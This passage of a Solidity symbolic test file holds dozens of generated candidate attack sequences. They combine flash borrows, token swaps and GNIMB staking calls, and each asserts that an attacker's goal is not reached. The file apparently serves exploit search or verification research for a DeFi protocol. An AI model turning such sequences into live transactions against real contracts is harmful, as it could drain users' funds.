    function check_cand179(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand180(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand181(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand182(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand183(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand184(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand185(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand186(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand187(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand188(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand189(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nbu_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand190(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand191(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand192(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbunimb_nimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand193(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_nbu_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand194(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand195(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand196(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        transaction_gnimbstaking_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand197(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        swap_pairnbugnimb_gnimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand198(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand199(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand200(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand201(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand202(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand203(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand204(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand205(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand206(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        vm.assume(amt3 == (amt1 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        borrow_owner_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_owner_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand207(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_owner_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_owner_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand208(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand209(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand210(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand211(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand212(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand213(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand214(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand215(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand216(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand217(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand218(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand219(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand220(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand221(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand222(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand223(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand224(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand225(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand226(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_gnimb_nbu(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand227(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand228(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nbu_nimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand229(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbunimb_nbu_nimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand230(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbunimb_nimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand231(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_gnimb_nbu(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand232(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_nbu_gnimb(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand233(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        swap_pairnbugnimb_nbu_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand234(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt3 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        swap_pairnbugnimb_gnimb_nbu(amt1);
        transaction_gnimbstaking_gnimb(amt2);
        payback_pairnbunimb_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand235(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand236(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand237(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbunimb_nbu_nimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand238(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nbu(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nbu(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand239(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_nimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_nimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand240(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
        borrow_pairnbunimb_gnimb(amt0);
        transaction_gnimbstaking_gnimb(amt1);
        payback_pairnbunimb_gnimb(amt2);
        swap_pairnbugnimb_nbu_gnimb(amt3);
        assert(!attackGoal());
        vm.stopPrank();
    }

    function check_cand241(
        uint256 amt0,
        uint256 amt1,
        uint256 amt2,
        uint256 amt3
    ) public {
        vm.startPrank(attacker);
        vm.warp(block.timestamp + 8 * 24 * 60 * 60);
        vm.assume(amt2 == (amt0 * 1003) / 1000);
